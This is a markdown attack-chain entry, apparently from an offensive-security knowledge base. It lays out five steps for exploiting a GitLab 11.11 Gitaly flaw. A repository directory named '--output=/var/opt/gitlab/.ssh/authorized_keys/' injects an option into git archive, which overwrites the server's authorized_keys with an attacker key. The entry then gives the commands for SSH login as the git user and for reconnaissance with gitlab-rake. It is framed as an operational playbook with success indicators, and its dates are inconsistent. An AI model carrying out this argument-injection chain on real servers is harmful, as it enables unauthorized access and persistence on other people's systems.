---
tags:
  - gitlab
  - gitaly
  - file-overwrite
  - rce
  - ssh
  - command-injection
type: attack_chain
tools:
  - '[[tools/ssh]]'
tactics:
  - '[[Initial Access]]'
  - '[[Execution]]'
  - '[[Persistence]]'
commands: []
platforms:
  - Linux
  - Ubuntu
  - Docker
complexity: medium
procedures:
  - '[[procedures/Create-Malicious-Git-Repository-for-File-Overwrite]]'
  - '[[procedures/Trigger-Git-Archive-Download-in-GitLab]]'
  - '[[procedures/Verify-Authorized-Keys-Overwrite]]'
  - '[[procedures/Establish-SSH-Connection-for-RCE]]'
  - '[[procedures/Gather-GitLab-Environment-Information]]'
step_count: 5
techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Command-Line Interface]]'
description: >-
  Exploitation of a vulnerability in GitLab's Gitaly component allowing
  arbitrary file overwrites via misinterpreted git archive commands, leading to
  remote code execution through SSH access.
skill_level: intermediate
impact_level: high
id: 60535c9f-33f1-4ae0-9ae5-e6b5d8715e33
created_at: '2025-12-11T03:47:40.223Z'
updated_at: '2025-12-11T03:47:40.223Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[TA0001]]'
  - '[[TA0002]]'
  - '[[TA0003]]'
mitre_techniques:
  - '[[T1190]]'
  - '[[T1059]]'
---
# GitLab Gitaly Arbitrary File Overwrite Leading to RCE via SSH

Multi-stage attack chain demonstrating exploitation of a GitLab vulnerability for arbitrary file overwrite and remote code execution.

## Chain Metrics Dashboard

| Metric | Value |
|--------|-------|
| Chain Status | Unverified |
| Total Steps | 5 |
| Execution Time | ~10 minutes |
| Skill Level | Intermediate |
| Complexity | Medium |
| Impact Level | High |

## Attack Flow Visualization

```mermaid
graph LR
    A[Create Malicious Repo] --> B[Trigger Archive Download]
    B --> C[Verify Overwrite]
    C --> D[SSH Access]
    D --> E[Gather Info]

    style A fill:#e74c3c
    style B fill:#f39c12
    style C fill:#3498db
    style D fill:#27ae60
    style E fill:#2ecc71
```

## Prerequisites & Requirements

### Required Tools

- #git
- #gitlab-rake
- [[tools/Gitaly]]
- #docker
- #cat
- [[tools/ssh]]
- #whoami
- #gitlab-rake

### Target Environment

- Linux/Ubuntu with Docker
- GitLab 11.11.0, Redis 3.2.12, PostgreSQL
- Ruby 2.5.3, Git 2.21.0, etc.

### Initial Access Requirements

- Access to create repositories in GitLab
- Network access to GitLab instance
- SSH key pair for exploitation

## Detailed Attack Procedures

### Step 1: Create Malicious Repository - [[procedures/Create-Malicious-Git-Repository-for-File-Overwrite]]

**Objective**: Set up a repository with a directory structure that exploits the git archive vulnerability to overwrite server files.

**Instructions**:

Create the directory structure using #git and verify with [[commands/tree-display]]:

```bash
tree
```

The structure includes a directory named '--output=/var/opt/gitlab/.ssh/authorized_keys/' containing 'id_ed25519.pub' with the attacker's public key.

**Expected Output**: Directory tree showing the crafted path.

**Success Indicators**:
- Repository created with exploit path
- Public key file in place

### Step 2: Trigger Archive Download - [[procedures/Trigger-Git-Archive-Download-in-GitLab]]

**Objective**: Initiate the download of the malicious directory to trigger the file overwrite via Gitaly.

**Instructions**:

In GitLab, click 'download directory as tar' under the crafted directory, which executes [[commands/git-archive-overwrite]]:

```bash
git --git-dir=DIR_TO_REPO archive --format tar --prefix=/ COMMIT_ID --output=/var/opt/gitlab/.ssh/authorized_keys
```

**Expected Output**: Tar archive written to authorized_keys file.

**Success Indicators**:
- Download triggers without errors
- Server file overwritten

### Step 3: Verify Overwrite - [[procedures/Verify-Authorized-Keys-Overwrite]]

**Objective**: Confirm the authorized_keys file has been overwritten with the attacker's key.

**Instructions**:

Access the server via [[commands/docker-exec-bash]]:

```bash
docker exec -ti e1a bash
```

Then check contents with [[commands/cat-file-contents]]:

```bash
cat /var/opt/gitlab/.ssh/authorized_keys
```

**Expected Output**: Tar headers and public key content.

**Success Indicators**:
- File contains injected key
- Verification confirms overwrite

### Step 4: Establish SSH Connection - [[procedures/Establish-SSH-Connection-for-RCE]]

**Objective**: Gain remote shell access as the git user using the injected key.

**Instructions**:

Connect via [[commands/ssh-connect-git]]:

```bash
ssh -i ~/.ssh/id_ed25519 git@10.26.0.3
```

Confirm user with [[commands/whoami-check]]:

```bash
whoami
```

**Expected Output**: SSH shell as 'git'.

**Success Indicators**:
- Successful SSH login
- 'git' user confirmed

### Step 5: Gather Environment Info - [[procedures/Gather-GitLab-Environment-Information]]

**Objective**: Collect configuration details from the compromised instance.

**Instructions**:

Run [[commands/gitlab-rake-env-info]]:

```bash
gitlab-rake gitlab:env:info
```

**Expected Output**: GitLab environment details.

**Success Indicators**:
- System info displayed
- Further reconnaissance possible

## Attack Chain Summary

### Key Achievements

1. Arbitrary file overwrite on GitLab server
2. SSH access as git user
3. Remote code execution and info gathering

## Technique & Tactic Coverage

### MITRE ATT&CK Techniques

- [[Exploit Public-Facing Application]]
- [[Command-Line Interface]]

### MITRE ATT&CK Tactics

- [[Initial Access]]
- [[Execution]]
- [[Persistence]]

*Last updated: 2023-10-01*
